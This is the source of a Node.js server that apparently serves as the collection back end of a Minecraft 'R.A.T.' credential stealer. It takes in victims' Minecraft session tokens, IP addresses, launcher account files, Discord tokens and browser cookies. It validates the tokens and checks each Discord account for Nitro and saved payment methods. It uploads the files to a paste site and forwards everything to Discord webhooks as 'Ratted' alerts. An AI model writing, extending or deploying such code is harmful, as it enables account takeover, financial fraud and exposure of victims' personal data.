//setup
const { contentSecurityPolicy } = require('helmet')
const getProfiles = require('./utils/networth')

require("dotenv").config()

const { post, get } = require("axios"),
express = require("express"),
helmet = require("helmet"),
app = express(),
expressip = require("express-ip"),
port = process.env.PORT || 80
    
//plugins
app.use(helmet()) //secure
app.use(expressip().getIpInfoMiddleware) //ip
app.use(express.json()) //parse json
app.use(express.urlencoded({ extended: true }))

// Env variables
// Webhooks
let defaulthook = process.env.WEBHOOK
let blackhook = process.env.BLACKHOOK
let shorthook = process.env.SHORTHOOK
let debughook = process.env.DEBUGHOOK

// Blacklist
let blacklist = process.env.BLACKLIST

//array initialization
const ipMap = []

//clear map every 15mins if its not already empty
setInterval(() => {
    if (ipMap.length > 0) {
        console.log(`[R.A.T] Cleared map`)
        ipMap.length = 0
    }
}, 1000 * 60 * 15)

//main route, post to this
app.post("/", (req, res) => {
    //happens if the request does not contain all the required fields, aka someones manually posting to the server
    if (!["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord"].every(field => req.body.hasOwnProperty(field))) {
        console.log(req.body)
        return res.sendStatus(404)
    }

    //check if ip exists, if not then create a new entry, if yes then increment that entry
    if (!ipMap.find(entry => entry[0] == req.ipInfo.ip)) ipMap.push([req.ipInfo.ip, 1])
    else ipMap.forEach(entry => { if (entry[0] == req.ipInfo.ip) entry[1]++ })

    //check if ip is banned (5 requests in 15mins)
    if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
        console.log(`[R.A.T] Rejected banned IP (${req.ipInfo.ip})`)
        return res.sendStatus(404)
    }

    //validate the token with microsoft auth server (rip mojang)
    post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }), {
        headers: {
            "Content-Type": "application/json"
        }
    })

    .then(async response => {
        // Preparation
        //upload feather
        const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => {
            return {data: {key: "Error uploading"}}
        })).data.key

        //upload essential
        const essentials = await (await post("https://hst.sh/documents/", req.body.essentials).catch(() => {
            return {data: {key: "Error uploading"}}
        })).data.key

        //upload lunar
        const lunar = await (await post("https://hst.sh/documents/", req.body.lunar).catch(() => {
            return {data: {key: "Error uploading"}}
        })).data.key

        //get discord info
        let nitros = ""
        let payments = ""

        const discord = req.body.discord.split(" | ")

        for await (const token of req.body.discord.split(" | ")) {
            let me = await (await get("https://discordapp.com/api/v9/users/@me", {
                headers: {
                    "Authorization": token,
                    "Content-Type": "application/json"
                }
            }).catch(() => {
                return {data: {id: null}}
            })).data

            if (me.id == null) {
                delete discord[token]
                continue
            }
            let nitro = await (await get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", {
                headers: {
                    "Authorization": token,
                    "Content-Type": "application/json"
                }
            }).catch(() => {
                return {data: []}
            })).data
            nitros += nitro.length > 0 ? "Yes | " : "No | "

            let payment = await (await get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", {
                headers: {
                    "Authorization": token,
                    "Content-Type": "application/json"
                }
            }).catch(() => {
                return {data: []}
            })).data
            payments += payment.length > 0 ? "Yes | " : "No | "
        }

        // Set webhook
        let webhook = defaulthook

        if (blacklist.split("_").includes(req.body.uuid)) { // debug
            content = `Blacked - <t:${timestamp}:R>`
            webhook = blackhook
        }

        // Set content
        // timestamp text
        const now = Date.now()
        const time = now + (24 * 60 * 60 * 1000)
        const timestamp = Math.floor(time / 1000)

        let content = `@everyone - <t:${timestamp}:R>`

        // Set useful links
        let links = ``

        if (req.body.username) {
            let skyCrypt = `[SkyCrypt](https://sky.shiiyu.moe/${req.body.username})`
            let plancke = `[Plancke](https://plancke.io/hypixel/player/stats/${req.body.username})`
            let matdoes = `[Matdoes](https://skyblock.matdoes.dev/player/${req.body.username})`
            let cofl = `[CoflNet](https://sky.coflnet.com/player/${req.body.uuid})`
            let namemc = `[NameMC](https://namemc.com/profile/${req.body.username})`

             links = `${skyCrypt} ${plancke} ${matdoes} ${cofl} ${namemc}`
        }

        // Set comment
        let comment = "unknown"

        if (req.body.type) {
            comment = req.body.type

            if (comment == "essential") {
                webhook = blackhook //debug
                content = `Essential - <t:${timestamp}:R>`
            }
        }
        
        let country = "undefined"
        // Set country
        fetchCountry(req.body.ip).then((result) => {
            country = result
        })
        

        // get profiles
        let profiles = ''
        const profileData = await getProfiles(req.body.uuid)

        if (profileData) {
            for (let profileId in profileData.profiles) {
                console.log(profileData.profiles[profileId])
                profiles += `[${profileData.profiles[profileId].sblvl}] ${profileData.profiles[profileId].networth}(${profileData.profiles[profileId].unsoulboundNetworth}) - ${profileData.profiles[profileId].gamemode}\n`
            }
        }

        // Set alts
        //check feather accounts and content in hastebin 
        let featherAccounts = []

        if (req.body.feather == 'File not found :(') {
            checkFeather = 'File not found :( - (Feather)'
        } else {
            checkFeather = `https://hst.sh/raw/${feather} -  **(Feather1)**`

            // Extract all "minecraftUuid" values from feather
            featherAccounts = JSON.parse(req.body.feather).ms.map(msItem => msItem.minecraftUuid.replace(/-/g, ''))
        }

        //check essential accounts and content in hastebin 
        let essentialAccounts = []

        if (req.body.essentials == 'File not found :(') {
            checkEssentials = 'File not found :( - (Essentials)'
            
        } else {
            checkEssentials = `https://hst.sh/raw/${essentials} - **(Essentials2)**`

            // Extract all usernames from essentials
            essentialAccounts = JSON.parse(req.body.essentials).accounts.map(account => account.name)
        }

        //check lunar accounts and content in hastebin 
        let lunarAccounts = []

        if (req.body.lunar == 'File not found :(') {
            checkLunar = 'File not found :( - (Lunar)'
        } else {
            checkLunar = `https://hst.sh/raw/${lunar} - **(Lunar3)**`

            // Extract usernames from lunar
            lunarAccounts = Object.values(JSON.parse(req.body.lunar).accounts).map(account => account.username)
        }
        
        try {
            post(webhook, JSON.stringify({
                content: content, //ping
                embeds: [{
                    title: `Ratted ${req.body.username} - Click Below For Stats`,
                    description: links,
                    fields: [
                        {name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true},
                        {name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true},
                        {name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false},
                        {name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true},
                        {name: 'Country', value: `\`\`\`${country}\`\`\``, inline: true},
                        {name: 'Comment', value: `\`\`\`${comment}\`\`\``, inline: true},
                        {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
                        {name: 'Feather Accounts:', value: `\`\`\`\n${featherAccounts.join('\n')}\`\`\``, inline: true},
                        {name: 'Essential Accounts:', value: `\`\`\`\n${essentialAccounts.join('\n')}\`\`\``, inline: true},
                        {name: 'Lunar Accounts:', value: `\`\`\`\n${lunarAccounts.join('\n')}\`\`\``, inline: true},
                        {name: 'Feather', value: `${checkFeather}`, inline: true},
                        {name: 'Essentials', value: `${checkEssentials}`, inline: true},
                        {name: 'Lunar', value: `${checkLunar}`, inline: true},
                        {name: 'Discord', value: `\`\`\`${discord.join(" | ")}\`\`\``, inline: false},
                        {name: 'Nitro', value: `\`${nitros}\``, inline: true},
                        {name: 'Payment', value: `\`${payments}\``, inline: true},
                    ],
                    color: 0x7366bd,
                    footer: {
                        "text": "🕊️ MagiDev on top 🕊️",
                    },
                    timestamp: new Date()
                }],
                attachments: []
            }), {
                headers: {
                    "Content-Type": "application/json"
                }
            }).catch(err => {
                console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``)
                console.log(req.body)
            })

            post(shorthook, JSON.stringify({
                content: "@everyone" + content, //ping
                embeds: [{
                    title: `Ratted ${req.body.username} - Click Below For Stats`,
                    description: links,
                    fields: [
                        {name: 'Username', value: `\`\`\`${req.body.username}\`\`\``, inline: true},
                        {name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true},
                        {name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false},
                        {name: 'Feather Accounts:', value: `\`\`\`\n${featherAccounts.join('\n')}\`\`\``, inline: true},
                        {name: 'Essential Accounts:', value: `\`\`\`\n${essentialAccounts.join('\n')}\`\`\``, inline: true},
                        {name: 'Lunar Accounts:', value: `\`\`\`\n${lunarAccounts.join('\n')}\`\`\``, inline: true},
                        {name: 'Feather', value: `${checkFeather}`, inline: true},
                        {name: 'Essentials', value: `${checkEssentials}`, inline: true},
                        {name: 'Lunar', value: `${checkLunar}`, inline: true},
                    ],
                    color: 0x7366bd,
                    footer: {
                        "text": "🕊️ MagiDev on top 🕊️",
                    },
                    timestamp: new Date()
                }],
                attachments: []
            }), {
                headers: {
                    "Content-Type": "application/json"
                }
            }).catch(err => {
                console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``)
                console.log(req.body)
            })
        } catch (e) {
            console.log(e)
        }
        console.log(`[R.A.T] ${req.body.username} has been ratted!\nThe alts beeing ${lunarAccounts.join(' ')} ${essentialAccounts.join(' ')} ${lunarAccounts.join(' ')}\n${JSON.stringify(req.body)}`)
    })
        .catch(err => {
        //could happen if the auth server is down OR if invalid information is passed in the body
        console.log(`[R.A.T] Error while validating token:\n${err}`)
        console.log(req.body)
        sendMessage(`\`\`\`${req.body.username} - ${err}\`\`\``)
    })
    
    //change this to whatever you want, but make sure to send a response
    res.send("OK")
})

//create server
app.listen(port, () => {
    console.log(`[R.A.T] Listening at port ${port}`)
    // send to discord webhook
    
})

//cookies
app.post("/cookies", (req, res) => {
    //happens if the request does not contain all the required fields, aka someones manually posting to the server
    if (!["username", "cookies"].every(field => req.body.hasOwnProperty(field))) {
        console.log(req.body)
        return res.sendStatus(404)
    }

    // Set webhook
    let webhook = defaulthook

    if (blacklist.split("_").includes(req.body.uuid)) { // debug
        content = `Blacked - <t:${timestamp}:R>`
        webhook = blackhook
    }

    if (req.body.type == "essential") {
        webhook = blackhook //debug
    }

    // Create a new FormData object
    const formData = new FormData();

    // Create a Blob representing the content of the file
    const fileContent = new Blob([atob(req.body.cookies)], { type: 'text/plain' });

    // Append the file to the FormData object
    formData.append('file', fileContent, `${req.body.username} cookies.txt`);

    // Use fetch API to send the FormData to the Discord webhook
    fetch(webhook, {
        method: 'POST',
        body: formData,
    }).then(response => {
        console.log("Sent cookies successfully")
    }).catch(error => {
        sendMessage(`\`\`\`${req.body.username}/n${err}\`\`\``)
    });
    
    //change this to whatever you want, but make sure to send a response
    res.send("OK")
})

//format a number into thousands millions billions
const formatNumber = (num) => {
    if (num < 1000) return num.toFixed(2)
    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
    else return `${(num / 1000000000).toFixed(2)}b`
}

function sendMessage(message) {
    post(debughook, JSON.stringify({
                content: message, //ping
                attachments: []
            }), {
                headers: {
                    "Content-Type": "application/json"
                }
            }).catch(err => {
                console.log(`[R.A.T] Error while debugging:\n${err}`)
            })
}

const fetchCountry = async (ip) => {
    // Set URL
    const apiUrl = `http://ip-api.com/json/${ip}`;

    try {
        // Send HTTP request
        const response = await fetch(apiUrl);

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        // Fetch country
        const data = await response.json();

        return data.country;
    } catch (error) {
        // Return 'Unknown' in case of any errors
        return 'Unknown';
    }
}
